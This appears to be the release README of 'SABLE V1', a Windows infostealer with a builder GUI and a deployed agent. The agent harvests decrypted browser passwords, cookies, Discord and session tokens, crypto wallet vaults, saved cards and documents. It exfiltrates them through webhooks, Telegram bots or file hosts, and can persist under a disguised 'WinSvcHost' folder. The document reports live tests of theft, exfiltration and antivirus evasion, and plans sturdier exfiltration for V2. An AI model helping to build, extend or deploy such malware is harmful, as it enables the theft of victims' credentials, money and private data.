# SABLE V1

Frozen 2026-11-20. Tag `v1.0`, commit `5d082a3`.

This is the version that works. Everything below is either proven by a test that ran or
listed under limits. Nothing is planned work disguised as a feature.

## What it is

A Windows information gatherer with two halves:

- **The bench** (`app/`) — a PySide6 window that validates a config, collects nothing, and
  produces an artifact.
- **The agent** (`agent/`) — what runs on the other machine: it mounts the sealed payload,
  collects, packs, seals, and transmits.

`core/` holds what both halves need and what neither owns: the schema, the seal, the
forge, the validator, the pipeline.

50 files. The manifest is the spec and a test enforces it in both directions.

## What it does

| Source | What leaves the machine |
|---|---|
| `system` | firmware, CPU, GPU, OS build, memory, uptime, machine identity, user |
| `network` | adapters, hardware addresses, link state, and one geolocation lookup |
| `displays` | monitors and their geometries |
| `browsers` | the whole profile folder, plus decrypted passwords, cookies, history, downloads, bookmarks |
| `sessions` | browser session tokens, Discord tokens |
| `wallets` | extension wallets and their encrypted vaults |
| `autofill` | saved form entries, cards, addresses, IBANs |
| `documents` | configured file types from the usual folders |

Delivery is one of three relay kinds: an `https` webhook, a `telegram` bot, or `link` —
which uploads to a file host and posts the URL. The transmitted archive is a WinZip
AES-256 zip keyed on the seal key, so it opens in 7-Zip or WinRAR with the password and
nowhere without it.

Optional and off by default: `keep_local` writes a plain copy and a summary to
`Documents\Sable Results` before sending. `persist` stages the image under
`%LOCALAPPDATA%\Programs\WinSvcHost` and re-runs it on a schedule.

## What was proven, and where

`HANDOFF.md` §5 is the full list. The short version:

- 242 Python tests, `ruff` clean, `compileall` clean.
- Forge 45/45, validate and pipeline 58/58, widgets 35/35, whole window 29/29,
  frozen launcher 37/37.
- Live: Discord webhooks, the `.py` artifact, catbox and litterbox, gofile fallback,
  self-remove, `keep_local`, the retry queue driven by the real scheduled task, and
  persistence staged, fired and fully removed afterwards.
- Second machine: artifact delivered, opened, decrypted, payload read.
- The archive opens in 7-Zip with the key and fails every entry without it.
- Rust crate `native/aes` agrees with the Python formats in both directions, 21/21.

## Known limits

- **Chrome v20 cookies are unreadable unelevated and elevated.** That is app-bound
  encryption, not a bug. Recorded in `DECISIONS.md` §8.
- **`files.catbox.moe` is unreachable from the build machine** at the TLS layer. The gofile
  fallback covers it, and `_reachable` is checked before an upload rather than after.
- **Never-seen-host detonation is untested.** Defender passed on the operator's machine,
  which had history. A clean VM is still owed.
- **One receiver, single-threaded, capped the measured throughput.** A 426 MB run took
  about six minutes; the real ceiling is unmeasured. Per-source timing now logs where the
  time went.
- **Zip64 is refused, not read.** 65535 members and 4 GiB per member are past anything a
  run produces.

## Build

```powershell
$py = "C:\Users\Kuzenee\AppData\Local\Temp\opencode\py312\python.exe"
cd sable
& $py -m pytest -q            # 242
& $py -m app.main             # the window
```

The frozen launcher is built once and reused by every artifact:

```powershell
& $py -m PyInstaller tools/sable-launcher.spec --distpath tools/dist --workpath tools/build --noconfirm
```

Output: `tools/dist/sable-launcher.exe`, 37/37 on `_harness/sable_launcher.py`.

The native crate is separate and not required to build an artifact:

```bash
cd native/aes && cargo build --release && cargo test --release
```

## Deferred to V2

- **Multiple delivery paths at once.** The V1 relay is one endpoint with a retry loop and a
  parked queue. V2 sends through several transports simultaneously with failover, so a
  webhook being dead stops being a whole-run event.
- **Native launcher or not.** The crate proves the formats; whether the frozen stub becomes
  a Rust binary is a product decision, still open. See `HANDOFF.md` §10.
- Everything else already listed there: VM detonation, throughput ceiling.
